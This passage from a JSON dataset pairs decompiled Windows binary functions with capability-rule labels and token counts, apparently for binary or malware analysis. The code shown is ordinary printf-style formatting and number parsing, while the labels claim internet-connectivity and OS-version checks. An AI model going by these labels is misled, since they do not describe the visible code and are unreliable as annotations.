break;\n            if ((((pcStack40 != var_20h) && (var_2ch != 0)) && (*(var_30h + 0x1c) != 0)) &&\n               (uVar6 = (var_20h - pcStack40 >> 0x1f) >> 0x1e,  ((var_20h - pcStack40) + uVar6 & 3) - uVar6 == 3)) {\n                pcVar5[1] = ',';\n                var_20h = pcVar5 + 2;\n            }\n        }\n    }\n    if ((0 < var_34h) && (iVar8 = var_34h - (pcVar4 - pcStack40),  0 < iVar8)) {\n        pcVar3 = pcVar4 + iVar8;\n        pcVar5 = pcVar4;\n        do {\n            pcVar4 = pcVar5 + 1;\n            *pcVar5 = '0';\n            pcVar5 = pcVar4;\n        } while (pcVar4 != pcVar3);\n    }\n    if ((pcStack40 == pcVar4) && (var_34h != 0)) {\n        *pcVar4 = '0';\n        pcVar4 = pcVar4 + 1;\n    }\n    if (0 < var_38h) {\n        iVar8 = var_38h - (pcVar4 - pcStack40);\n        *(param_1 + 8) = iVar8;\n        if (0 < iVar8) {\n            if ((uStack44 & 0x1c0) != 0) {\n                *(param_1 + 8) = iVar8 + -1;\n            }\n            if ((var_34h < 0) && ((uStack44 & 0x600) == 0x200)) {\n                iVar8 = *(param_1 + 8);\n                *(param_1 + 8) = iVar8 + -1;\n                if (0 < iVar8) {\n                    pcVar3 = pcVar4 + iVar8;\n                    pcVar5 = pcVar4;\n                    do {\n                        pcVar4 = pcVar5 + 1;\n                        *pcVar5 = '0';\n                        pcVar5 = pcVar4;\n                    } while (pcVar4 != pcVar3);\n                    *(param_1 + 8) = 0xffffffff;\n                }\n            }\n            else if (((uStack44 & 0x400) == 0) && (iVar8 = *(param_1 + 8),  *(param_1 + 8) = iVar8 + -1,  0 < iVar8)) {\n                do {\n                    *(&stack0xffffffb0 + iVar2) = 0x422a8c;\n                    fcn.00421fc0();\n                    iVar8 = *(param_1 + 8);\n                    *(param_1 + 8) = iVar8 + -1;\n                } while (0 < iVar8);\n                uStack44 = *(param_1 + 4);\n            }\n        }\n    }\n    pcVar5 = pcStack40;\n    if ((uStack44 & 0x80) == 0) {\n        if ((uStack44 & 0x100) == 0) {\n            pcVar3 = pcVar4;\n            if ((uStack44 & 0x40) != 0) {\n                pcVar3 = pcVar4 + 1;\n                *pcVar4 = ' ';\n            }\n        }\n        else {\n            *pcVar4 = '+';\n            pcVar3 = pcVar4 + 1;\n        }\n    }\n    else {\n        *pcVar4 = '-';\n        pcVar3 = pcVar4 + 1;\n    }\n    if (pcVar3 <= pcStack40) goto code_r0x00422a0e;\n    do {\n        pcVar3 = pcVar3 + -1;\n        *(&stack0xffffffb0 + iVar2) = 0x4229f1;\n        fcn.00421fc0();\n    } while (pcVar5 != pcVar3);\n    iVar8 = *(param_1 + 8);\n    *(param_1 + 8) = iVar8 + -1;\n    while (0 < iVar8) {\n        *(&stack0xffffffb0 + iVar2) = 0x422a0e;\n        fcn.00421fc0();\ncode_r0x00422a0e:\n        iVar8 = *(param_1 + 8);\n        *(param_1 + 8) = iVar8 + -1;\n    }\n    return;\n}\n",
        "token_count": 1782
    },
    "00422e40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00422e40(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint8_t *puVar11;\n    uint32_t uStack64;\n    uint32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint8_t *var_28h;\n    uint8_t var_21h;\n    uint8_t *var_20h;\n    uint8_t *var_1ch;\n    uint var_ch;\n    \n    var_1ch = (in_EAX != 0x6f) + 3;\n    var_30h = *(arg_8h + 0xc);\n    var_38h = *(arg_8h + 4);\n    var_34h = *(arg_8h + 8);\n    uStack64 = 0x422eb8;\n    var_2ch = in_EAX;\n    iVar4 = fcn.00418950();\n    iVar4 = -iVar4;\n    var_28h = &fcn.00422e40::var_2ch + iVar4 + 3 & 0xfffffff0;\n    uVar1 = (var_2ch != 0x6f) * '\\b' + 7;\n    puVar8 = var_28h;\n    if ((in_ECX | in_EDX) == 0) {\ncode_r0x004230c4:\n        *(arg_8h + 4) = var_38h & 0xfffff7ff;\n    }\n    else {\n        var_20h = var_20h & 0xffffff00 | uVar1;\n        var_21h = var_2ch & 0x20;\n        puVar11 = var_28h;\n        do {\n            puVar8 = puVar11 + 1;\n            uVar3 = uVar1 & in_EDX;\n            uVar7 = uVar3 + 0x30;\n            uVar3 = uVar3 + 0x37 | var_2ch & 0x20;\n            if (uVar7 < 0x3a) {\n                uVar3 = uVar7;\n            }\n            *puVar11 = uVar3;\n            uVar6 = in_ECX << 0x20 - (var_1ch & 0x1f);\n            uVar9 = in_ECX >> (var_1ch & 0x1f);\n            in_ECX = uVar9;\n            in_EDX = in_EDX >> (var_1ch & 0x1f) | uVar6;\n            if ((var_1ch & 0x20) != 0) {\n                in_ECX = 0;\n                in_EDX = uVar9;\n            }\n            puVar11 = puVar8;\n        } while ((in_ECX | in_EDX) != 0);\n        if (var_28h == puVar8) goto code_r0x004230c4;\n    }\n    if ((var_30h < 1) || (iVar10 = var_30h - (puVar8 - var_28h),  iVar10 < 1)) {\n        if ((var_2ch == 0x6f) && ((*(arg_8h + 5) & 8) != 0)) {\n            *puVar8 = 0x30;\n            puVar8 = puVar8 + 1;\n        }\n    }\n    else {\n        puVar5 = puVar8 + iVar10;\n        puVar11 = puVar8;\n        do {\n            puVar8 = puVar11 + 1;\n            *puVar11 = 0x30;\n            puVar11 = puVar8;\n        } while (puVar8 != puVar5);\n    }\n    if ((var_30h != 0) && (var_28h == puVar8)) {\n        *puVar8 = 0x30;\n        puVar8 = puVar8 + 1;\n    }\n    if (puVar8 - var_28h < var_34h) {\n        puVar11 = var_34h - (puVar8 - var_28h);\n        *(arg_8h + 8) = puVar11;\n        uVar6 = *(arg_8h + 4);\n        if (var_2ch == 0x6f) {\n            if ((var_30h < 0) && ((uVar6 & 0x600) == 0x200)) {\ncode_r0x00423180:\n                puVar11 = puVar11 + puVar8;\n                puVar5 = puVar8;\n                do {\n                    puVar8 = puVar5 + 1;\n                    *puVar5 = 0x30;\n                    puVar5 = puVar8;\n                } while (puVar8 != puVar11);\n                puVar11 = 0xffffffff;\n                if (var_2ch != 0x6f) goto joined_r0x0042319b;\n                goto code_r0x00423154;\n            }\n            puVar5 = puVar11 + -1;\n            if ((uVar6 & 0x400) == 0) {\n                var_1ch = puVar8;\n                goto code_r0x004230e3;\n            }\n        }\n        else {\n            if ((uVar6 & 0x800) == 0) {\n                if (var_30h < 0) goto code_r0x00423164;\ncode_r0x0042312a:\n                var_1ch = puVar8;\n            }\n            else {\n                puVar11 = puVar11 + -2;\n                if ((0 < puVar11) && (var_30h < 0)) {\ncode_r0x00423164:\n                    if ((uVar6 & 0x600) == 0x200) goto code_r0x00423180;\n                    if ((uVar6 & 0x800) == 0) goto code_r0x0042312a;\n                }\ncode_r0x00423041:\n                puVar8[1] = 0x30;\n                *puVar8 = var_2ch;\n                puVar8 = puVar8 + 2;\n                var_1ch = puVar8;\n                if (puVar11 < 1) goto code_r0x00423154;\n            }\n            puVar5 = puVar11 + -1;\n            puVar8 = var_1ch;\n            if ((uVar6 & 0x400) == 0) {\ncode_r0x004230e3:\n                do {\n                    *(&stack0xffffffc0 + iVar4) = 0x4230f2;\n                    fcn.00421fc0();\n                    bVar2 = 0 < puVar5;\n                    puVar5 = puVar5 + -1;\n                } while (bVar2);\n                if (var_1ch <= var_28h) {\n                    return;\n                }\n                var_20h = 0xfffffffe;\n                puVar11 = 0xffffffff;\n                puVar8 = var_1ch;\n                goto code_r0x00423111;\n            }\n        }\n        if (puVar8 <= var_28h) goto code_r0x00422fd0;\ncode_r0x00422f9c:\n        var_1ch = puVar11;\n        var_20h = puVar5;\n        puVar11 = var_28h;\n    }\n    else {\n        *(arg_8h + 8) = 0xffffffff;\n        if (var_2ch == 0x6f) {\n            puVar5 = 0xfffffffe;\n            puVar11 = 0xffffffff;\n            if (puVar8 <= var_28h) {\n                return;\n            }\n            goto code_r0x00422f9c;\n        }\n        uVar6 = *(arg_8h + 4);\njoined_r0x0042319b:\n        puVar11 = 0xffffffff;\n        if ((uVar6 & 0x800) != 0) goto code_r0x00423041;\ncode_r0x00423154:\n        if (puVar8 <= var_28h) {\n            return;\n        }\n        var_20h = puVar11 + -1;\ncode_r0x00423111:\n        var_1ch = puVar11;\n        puVar11 = var_28h;\n    }\n    do {\n        puVar8 = puVar8 + -1;\n        *(&stack0xffffffc0 + iVar4) = 0x422fbd;\n        fcn.00421fc0();\n    } while (puVar11 < puVar8);\n    puVar5 = var_20h;\n    if (var_1ch < 1) {\n        return;\n    }\ncode_r0x00422fd0:\n    do {\n        *(&stack0xffffffc0 + iVar4) = 0x422fdf;\n        fcn.00421fc0();\n        bVar2 = 0 < puVar5;\n        puVar5 = puVar5 + -1;\n    } while (bVar2);\n    return;\n}\n",
        "token_count": 2149
    },
    "004237b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffc0 : 0x00423e93\n\nint32_t fcn.004237b0(uint32_t param_1, uint param_2, uint param_3, char *param_4, unkbyte10 *param_5)\n\n{\n    unkbyte10 Var1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    char cVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    char16_t *pcVar11;\n    unkbyte10 *pVar12;\n    float10 fVar13;\n    int32_t iStack132;\n    int32_t *piStack124;\n    ushort uStack94;\n    uint32_t uStack92;\n    int32_t iStack88;\n    int32_t iStack84;\n    int32_t iStack80;\n    uint uStack72;\n    uint32_t uStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint uStack56;\n    ushort uStack52;\n    int32_t iStack48;\n    ushort uStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uint uStack32;\n    \n    puVar4 = sub.msvcrt.dll__errno();\n    uVar2 = *puVar4;\n    iStack64 = -1;\n    iStack60 = -1;\n    uStack56 = 0xfffffffd;\n    uStack52 = 0;\n    iStack48 = 0;\n    uStack44 = 0;\n    iStack40 = 0;\n    uStack32 = 0xffffffff;\n    param_1 = param_1 & 0x6000;\n    iVar5 = *param_4;\n    uStack72 = param_2;\n    uStack68 = param_1;\n    uStack36 = param_3;\njoined_r0x00423844:\n    while( true ) {\n        if (iVar5 == 0) {\n            return iStack40;\n        }\n        pcVar10 = param_4 + 1;\n        if (iVar5 == 0x25) break;\n        fcn.00421fc0();\n        iVar5 = param_4[1];\n        param_4 = pcVar10;\n    }\n    cVar7 = param_4[1];\n    iStack60 = -1;\n    iStack64 = -1;\n    uVar9 = 0;\n    iStack132 = 0;\n    piStack124 = &iStack64;\n    param_4 = pcVar10;\n    uStack68 = param_1;\ncode_r0x004238a4:\n    iVar5 = cVar7;\n    pcVar8 = param_4;\n    if (cVar7 != '\\0') {\ncode_r0x004238b4:\n        param_4 = pcVar8 + 1;\n    // switch table (91 cases) at 0x505fc0\n        switch(cVar7) {\n        case ' ':\n            goto code_r0x00423930;\n        default:\n            if ((9 < cVar7 - 0x30U) || (3 < uVar9)) goto code_r0x00423f3e;\n            if (uVar9 == 0) {\n                uVar9 = 1;\n            }\n            else {\ncode_r0x00423ebe:\n                if (uVar9 == 2) {\n                    uVar9 = 3;\n                }\n            }\n            if (piStack124 == NULL) goto code_r0x00423980;\n            if (*piStack124 < 0) {\n                *piStack124 = iVar5 + -0x30;\n                goto code_r0x00423980;\n            }\n            cVar7 = pcVar8[1];\n            *piStack124 = iVar5 + -0x30 + *piStack124 * 10;\n            goto code_r0x004238a4;\n        case '#':\n            if (uVar9 != 0) goto code_r0x00423980;\n            cVar7 = pcVar8[1];\n            uStack68 = uStack68 | 0x800;\n            goto code_r0x004238a4;\n        case '%':\n            fcn.00421fc0();\n            break;\n        case '\\'':\n            if (uVar9 != 0) goto code_r0x00423980;\n            uStack68 = uStack68 | 0x1000;\n            uStack92 = 0;\n            iVar5 = sub.msvcrt.dll_localeconv();\n            iStack48 = fcn.0041d4f0(&uStack94, *(iVar5 + 4), 0x10, &uStack92);\n            if (0 < iStack48) {\n                uStack44 = uStack94;\n            }\n            cVar7 = pcVar8[1];\n            goto code_r0x004238a4;\n        case '*':\n            if (piStack124 == NULL) goto code_r0x00423ca9;\n            if ((uVar9 & 0xfffffffd) != 0) {\n                cVar7 = pcVar8[1];\n                piStack124 = NULL;\n                uVar9 = 4;\n                goto code_r0x004238a4;\n            }\n            iVar5 = *param_5;\n            param_5 = param_5 + 4;\n            *piStack124 = iVar5;\n            if (iVar5 < 0) {\n                if (uVar9 == 0) {\n                    cVar7 = pcVar8[1];\n                    uStack68 = uStack68 | 0x400;\n                    iStack64 = -iStack64;\n                    piStack124 = NULL;\n                    goto code_r0x004238a4;\n                }\n                iStack60 = -1;\n            }\n            cVar7 = pcVar8[1];\n            piStack124 = NULL;\n            goto code_r0x004238a4;\n        case '+':\n            if (uVar9 != 0) goto code_r0x00423980;\n            cVar7 = pcVar8[1];\n            uStack68 = uStack68 | 0x100;\n            goto code_r0x004238a4;\n        case '-':\n            if (uVar9 != 0) goto code_r0x00423980;\n            cVar7 = pcVar8[1];\n            uStack68 = uStack68 | 0x400;\n            goto code_r0x004238a4;\n        case '.':\n            if (uVar9 < 2) {\n                piStack124 = &iStack60;\n                cVar7 = pcVar8[1];\n                iStack60 = 0;\n                uVar9 = 2;\n            }\n            else {\ncode_r0x00423ca9:\n                cVar7 = pcVar8[1];\n                uVar9 = 4;\n            }\n            goto code_r0x004238a4;\n        case '0':\n            if (uVar9 == 0) {\n                cVar7 = pcVar8[1];\n                uStack68 = uStack68 | 0x200;\n                goto code_r0x004238a4;\n            }\n            if (uVar9 < 4) goto code_r0x00423ebe;\ncode_r0x00423f3e:\n            fcn.00421fc0();\n            param_4 = pcVar10;\n            break;\n        case 'A':\n            if ((uStack68 & 4) != 0) goto code_r0x00423b83;\ncode_r0x00423cec:\n            fVar13 = *param_5;\n            param_5 = param_5 + 8;\n            fcn.004231b0(SUB104(fVar13, 0), fVar13 >> 0x20, fVar13 >> 0x40);\n            break;\n        case 'C':\ncode_r0x00423d0f:\n            iStack60 = -1;\n            uStack92 = uStack92 & 0xffff0000 | *param_5 & 0xffff;\n            fcn.00422020();\n            param_5 = param_5 + 4;\n            break;\n        case 'E':\n            if ((uStack68 & 4) == 0) goto code_r0x0042399f;\ncode_r0x0042394c:\n            Var1 = *param_5;\n            fcn.00422c00(Var1, Var1 >> 0x20, Var1 >> 0x40);\n            param_5 = param_5 + 0xc;\n            break;\n        case 'F':\n            if ((uStack68 & 4) != 0) goto code_r0x004239c7;\ncode_r0x00423bd0:\n            fVar13 = *param_5;\n            fcn.00422750(SUB104(fVar13, 0), fVar13 >> 0x20, fVar13 >> 0x40);\n            param_5 = param_5 + 8;\n            break;\n        case 'G':\n            if ((uStack68 & 4) != 0) goto code_r0x004239f3;\ncode_r0x00423bac:\n            fVar13 = *param_5;\n            fcn.00422cb0(SUB104(fVar13, 0), fVar13 >> 0x20, fVar13 >> 0x40);\n            param_5 = param_5 + 8;\n            break;\n        case 'I':\n            cVar7 = pcVar8[1];\n            if (cVar7 == '6') {\n                if (pcVar8[2] != '4') goto code_r0x00423f3e;\n                param_4 = pcVar8 + 3;\n                cVar7 = pcVar8[3];\n                iStack132 = 3;\n                uVar9 = 4;\n            }\n            else if (cVar7 == '3') {\n                if (pcVar8[2] != '2') goto code_r0x00423ef9;\n                param_4 = pcVar8 + 3;\n                cVar7 = pcVar8[3];\n                iStack132 = 2;\n                uVar9 = 4;\n            }\n            else {\n                iStack132 = 0;\n                uVar9 = 4;\n            }\n            goto code_r0x004238a4;\n        case 'L':\n            cVar7 = pcVar8[1];\n            uStack68 = uStack68 | 4;\n            uVar9 = 4;\n            goto code_r0x004238a4;\n        case 'S':\ncode_r0x00423dc6:\n            pcVar11 = *param_5;\n            if (pcVar11 == NULL) {\n                pcVar11 = L\"(null)\";\n            }\n            if (iStack60 < 0) {\n                sub.msvcrt.dll_wcslen(pcVar11);\n            }\n            else {\n                fcn.004277a0(pcVar11, iStack60);\n            }\n            fcn.00422020();\n            param_5 = param_5 + 4;\n            break;\n        case 'X':\n        case 'o':\n        case 'u':\n        case 'x':\n            if (iStack132 == 3) {\n                uStack92 = *param_5;\n                iStack88 = *(param_5 + 4);\n                pVar12 = param_5 + 8;\n            }\n            else {\n                pVar12 = param_5 + 4;\n                uStack92 = *param_5;\n                if (iStack132 != 2) {\n                    if (iStack132 == 1) {\n                        uStack92 = uStack92 & 0xffff;\n                        iStack88 = 0;\n                        goto code_r0x00423b48;\n                    }\n                    if (iStack132 == 5) {\n                        uStack92 = uStack92 & 0xff;\n                    }\n                }\n                iStack88 = 0;\n            }\ncode_r0x00423b48:\n            if (iVar5 == 0x75) goto code_r0x00423c73;\n            fcn.00422e40(&uStack72);\n            param_5 = pVar12;\n            break;\n        case 'a':\n            uVar6 = uStack68 | 0x20;\n            uVar9 = uStack68 & 4;\n            uStack68 = uVar6;\n            if (uVar9 == 0) goto code_r0x00423cec;\ncode_r0x00423b83:\n            Var1 = *param_5;\n            param_5 = param_5 + 0xc;\n            fcn.004231b0(Var1, Var1 >> 0x20, Var1 >> 0x40);\n            break;\n        case 'c':\n            iStack60 = -1;\n            if (iStack132 - 2U < 2) goto code_r0x00423d0f;\n            uStack92 = uStack92 & 0xffffff00 | *param_5 & 0xff;\n            fcn.00422140();\n            param_5 = param_5 + 4;\n            break;\n        case 'd':\n        case 'i':\n            uStack68 = uStack68 | 0x80;\n            if (iStack132 == 3) {\n                uStack92 = *param_5;\n                iStack88 = *(param_5 + 4);\n                pVar12 = param_5 + 8;\n            }\n            else {\n                pVar12 = param_5 + 4;\n                uStack92 = *param_5;\n                if (iStack132 != 2) {\n                    if (iStack132 == 1) {\n                        uStack92 = uStack92;\n                        iStack88 = uStack92 >> 0x1f;\n                        goto code_r0x00423c5f;\n                    }\n                    if (iStack132 == 5) {\n                        uStack92 = uStack92;\n                    }\n                }\n                iStack88 = uStack92 >> 0x1f;\n            }\ncode_r0x00423c5f:\n            iStack84 = iStack88 >> 0x1f;\n            iStack80 = iStack84;\ncode_r0x00423c73:\n            fcn.00422820();\n            param_5 = pVar12;\n            break;\n        case 'e':\n            uVar6 = uStack68 | 0x20;\n            uVar9 = uStack68 & 4;\n            uStack68 = uVar6;\n            if (uVar9 != 0) goto code_r0x0042394c;\ncode_r0x0042399f:\n            fVar13 = *param_5;\n            fcn.00422c00(SUB104(fVar13, 0), fVar13 >> 0x20, fVar13 >> 0x40);\n            param_5 = param_5 + 8;\n            break;\n        case 'f':\n            uVar6 = uStack68 | 0x20;\n            uVar9 = uStack68 & 4;\n            uStack68 = uVar6;\n            if (uVar9 == 0) goto code_r0x00423bd0;\ncode_r0x004239c7:\n            Var1 = *param_5;\n            fcn.00422750(Var1, Var1 >> 0x20, Var1 >> 0x40);\n            param_5 = param_5 + 0xc;\n            break;\n        case 'g':\n            uVar6 = uStack68 | 0x20;\n            uVar9 = uStack68 & 4;\n            uStack68 = uVar6;\n            if (uVar9 == 0) goto code_r0x00423bac;\ncode_r0x004239f3:\n            Var1 = *param_5;\n            fcn.00422cb0(Var1, Var1 >> 0x20, Var1 >> 0x40);\n            param_5 = param_5 + 0xc;\n            break;\n        case 'h':\n            cVar7 = pcVar8[1];\n            iStack132 = 1;\n            uVar9 = 4;\n            if (cVar7 != 'h') goto code_r0x004238e1;\n            param_4 = pcVar8 + 2;\n            cVar7 = pcVar8[2];\n            iStack132 = 5;\n            goto code_r0x004238a4;\n        case 'j':\n            cVar7 = pcVar8[1];\n            iStack132 = 3;\n            uVar9 = 4;\n            goto code_r0x004238a4;\n        case 'l':\n            cVar7 = pcVar8[1];\n            iStack132 = 2;\n            uVar9 = 4;\n            if (cVar7 != 'l') goto code_r0x004238e1;\n            param_4 = pcVar8 + 2;\n            cVar7 = pcVar8[2];\n            iStack132 = 3;\n            goto code_r0x004238a4;\n        case 'm':\n            sub.msvcrt.dll_strerror(uVar2);\n            fcn.00422200();\n            break;\n        case 'n':\n            piVar3 = *param_5;\n            param_5 = param_5 + 4;\n            if (iStack132 == 5) {\n                *piVar3 = iStack40;\n            }\n            else if (iStack132 == 1) {\n                *piVar3 = iStack40;\n            }\n            else if (iStack132 == 2) {\n                *piVar3 = iStack40;\n            }\n            else {\n                *piVar3 = iStack40;\n                if (iStack132 == 3) {\n                    piVar3[1] = iStack40 >> 0x1f;\n                }\n            }\n            break;\n        case 'p':\n            if ((uVar9 == 0) && (uStack68 == param_1)) {\n                uStack68 = param_1 | 0x200;\n                iStack60 = 8;\n            }\n            uStack92 = *param_5;\n            iStack88 = 0;\n            iStack84 = 0;\n            iStack80 = 0;\n            fcn.00422e40(&uStack72);\n            param_5 = param_5 + 4;\n            break;\n        case 's':\n            if (iStack132 - 2U < 2) goto code_r0x00423dc6;\n            fcn.00422200();\n            param_5 = param_5 + 4;\n            break;\n        case 't':\n        case 'z':\n            cVar7 = pcVar8[1];\n            iStack132 = 0;\ncode_r0x004238e1:\n            uVar9 = 4;\n            goto code_r0x004238a4;\n        }\n        iVar5 = *param_4;\n    }\n    goto joined_r0x00423844;\ncode_r0x00423ef9:\n    uVar9 = 4;\n    iStack132 = 0;\n    iVar5 = 0x33;\n    pcVar8 = param_4;\n    goto code_r0x004238b4;\ncode_r0x00423930:\n    if (uVar9 == 0) {\n        cVar7 = pcVar8[1];\n        uStack68 = uStack68 | 0x40;\n    }\n    else {\ncode_r0x00423980:\n        cVar7 = pcVar8[1];\n    }\n    goto code_r0x004238a4;\n}\n",
        "token_count": 4327
    },
    "00425920": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint8_t fcn.00425920(uint8_t **param_1, uint32_t *param_2, uint32_t *param_3, int32_t *param_4, uint32_t param_5)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    uint8_t **ppuVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint32_t *puVar10;\n    uint8_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    uint8_t uVar14;\n    uint8_t *puVar15;\n    uint32_t *puVar16;\n    uint32_t uVar17;\n    int32_t iVar18;\n    uint8_t uVar19;\n    uint32_t *puVar20;\n    int32_t iVar21;\n    uint32_t uVar22;\n    bool bVar23;\n    uint8_t *puStack56;\n    uint8_t *puStack52;\n    uint32_t uStack44;\n    int32_t iStack40;\n    uint32_t *puStack36;\n    int32_t iStack32;\n    \n    ppuVar5 = sub.msvcrt.dll_localeconv();\n    puVar3 = *ppuVar5;\n    if (*0x549e30 == '\\0') {\n        fcn.00426490();\n    }\n    *param_4 = 0;\n    puStack52 = *param_1;\n    uVar14 = puStack52[2];\n    if (uVar14 == 0x30) {\n        iVar12 = 0;\n        puVar7 = puStack52 + 3;\n        do {\n            puStack52 = puVar7;\n            uVar14 = *puStack52;\n            iVar12 = iVar12 + 1;\n            puVar7 = puStack52 + 1;\n        } while (uVar14 == 0x30);\n    }\n    else {\n        puStack52 = puStack52 + 2;\n        iVar12 = 0;\n    }\n    puStack56 = puStack52;\n    uVar11 = *puVar3;\n    if (*(uVar14 + 0x549e00) == '\\0') {\n        puVar7 = puStack52;\n        if ((uVar11 != 0) && (puVar6 = puStack52,  puVar15 = puVar3,  uVar14 == uVar11)) {\ncode_r0x004259c1:\n            puVar6 = puVar6 + 1;\n            uVar1 = puVar15[1];\n            uVar19 = *puVar6;\n            if (uVar1 != 0) goto code_r0x004259b3;\n            cVar2 = *(uVar19 + 0x549e00);\n            puVar7 = puVar6;\n            uVar14 = uVar19;\n            if (cVar2 != '\\0') {\n                puVar15 = puVar6;\n                if (uVar19 == 0x30) {\n                    do {\n                        puVar15 = puVar15 + 1;\n                        uVar19 = *puVar15;\n                    } while (uVar19 == 0x30);\n                    cVar2 = *(uVar19 + 0x549e00);\n                }\n                bVar23 = cVar2 == '\\0';\n                puStack56 = puVar15;\n                if (!bVar23) {\n                    iVar12 = 1;\n                    goto code_r0x00425b62;\n                }\n                iVar12 = 1;\n                if (uVar11 != uVar19) goto code_r0x00425a30;\n                goto code_r0x00425b8c;\n            }\n        }\ncode_r0x00425baa:\n        puVar15 = puVar7;\n        if ((uVar14 == 0x50) || (uVar14 == 0x70)) {\n            uStack44 = 0;\n            bVar23 = true;\n            goto code_r0x00425bd2;\n        }\n        bVar23 = true;\n        uStack44 = 0;\n        puStack52 = NULL;\n        bVar4 = false;\ncode_r0x00425d88:\n        if (iVar12 == 0) {\n            puVar7 = puStack56 + -1;\n        }\n        *param_1 = puVar7;\n        if (bVar23) {\n            return 0;\n        }\n        if (bVar4) {\n            uVar8 = param_2[3];\n            if (puStack52 != NULL) {\n                if (uVar8 == 2) {\n                    if (param_5 != 0) goto code_r0x00425d4a;\n                }\n                else if ((uVar8 != 3) || (param_5 == 0)) goto code_r0x00425d4a;\n                iStack40 = fcn.004269b0(0);\n                *(iStack40 + 0x10) = 1;\n                *(iStack40 + 0x14) = 1;\n                uVar8 = param_2[1];\n                goto code_r0x00425e04;\n            }\n            if (uVar8 == 2) {\n                if (param_5 != 0) goto code_r0x00425efb;\n            }\n            else if (uVar8 == 3) {\n                if (param_5 == 0) goto code_r0x00425efb;\n            }\n            else if (uVar8 != 1) {\ncode_r0x00425efb:\n                uVar8 = *param_2 & 0x1f;\n                iVar18 = *param_2 >> 5;\n                iVar21 = (iVar18 + 1) - (uVar8 == 0);\n                iVar12 = 0;\n                iVar13 = iVar21;\n                while (iVar13 = iVar13 >> 1,  iVar13 != 0) {\n                    iVar12 = iVar12 + 1;\n                }\n                iVar12 = fcn.004269b0(iVar12);\n                *param_4 = iVar12;\n                *(iVar12 + 0x10) = iVar21;\n                if (0 < iVar18) {\n                    puVar9 = iVar12 + 0x14;\n                    do {\n                        *puVar9 = 0xffffffff;\n                        puVar9 = puVar9 + 1;\n                        puStack52 = iVar18;\n                    } while (puVar9 != iVar12 + 0x14 + iVar18 * 4);\n                }\n                if (iVar18 < iVar21) {\n                    *(iVar12 + 0x14 + puStack52 * 4) = 0x20 >> (0x20U - uVar8 & 0x1f);\n                }\n                *param_3 = param_2[1];\n                return 0x11;\n            }\n            goto code_r0x00425f8e;\n        }\n    }\n    else {\n        iVar12 = iVar12 + 1;\n        bVar23 = false;\n        puVar6 = NULL;\n        puVar15 = puStack52;\ncode_r0x00425b62:\n        do {\n            puVar7 = puVar15;\n            puVar15 = puVar7 + 1;\n        } while (*(puVar7[1] + 0x549e00) != '\\0');\n        if (puVar7[1] == uVar11) {\n            if (puVar6 == NULL) {\n                if (puVar3[1] != 0) {\n                    if (puVar7[2] == puVar3[1]) {\n                        puVar6 = puVar7 + 3;\n                        puVar7 = puVar3 + 2;\n                        do {\n                            uVar14 = *puVar7;\n                            uVar11 = *puVar6;\n                            if (uVar14 == 0) goto code_r0x0042604a;\n                            puVar6 = puVar6 + 1;\n                            puVar7 = puVar7 + 1;\n                        } while (uVar14 == uVar11);\n                        uVar11 = *puVar15;\n                        uStack44 = 0;\n                    }\n                    else {\n                        uStack44 = 0;\n                    }\n                    goto code_r0x00425a48;\n                }\n                uVar11 = puVar7[2];\n                puVar6 = puVar7 + 2;\ncode_r0x0042604a:\n                cVar2 = *(uVar11 + 0x549e00);\n                puVar15 = puVar6;\n                while (cVar2 != '\\0') {\n                    puVar15 = puVar15 + 1;\n                    uVar11 = *puVar15;\n                    cVar2 = *(uVar11 + 0x549e00);\n                }\n            }\n            else {\ncode_r0x00425b8c:\n                uVar11 = *puVar15;\n            }\ncode_r0x00425a3f:\n            uStack44 = (puVar6 - puVar15) * 4;\n        }\n        else {\ncode_r0x00425a30:\n            uVar11 = *puVar15;\n            uStack44 = 0;\n            if (puVar6 != NULL) goto code_r0x00425a3f;\n        }\ncode_r0x00425a48:\n        if ((uVar11 == 0x50) || (uVar11 == 0x70)) {\ncode_r0x00425bd2:\n            uVar14 = puVar15[1];\n            if (uVar14 == 0x2b) {\n                puStack52 = NULL;\ncode_r0x00425e38:\n                puVar6 = puVar15 + 2;\n                uVar14 = puVar15[2];\n            }\n            else {\n                if (uVar14 == 0x2d) {\n                    puStack52 = 0x1;\n                    goto code_r0x00425e38;\n                }\n                puVar6 = puVar15 + 1;\n                puStack52 = NULL;\n            }\n            bVar4 = false;\n            puVar7 = puVar15;\n            if (*(uVar14 + 0x549e00) - 1 < 0x19) {\n                uVar8 = *(uVar14 + 0x549e00) - 0x10;\n                puVar7 = puVar6 + 1;\n                uVar14 = *(puVar6[1] + 0x549e00);\n                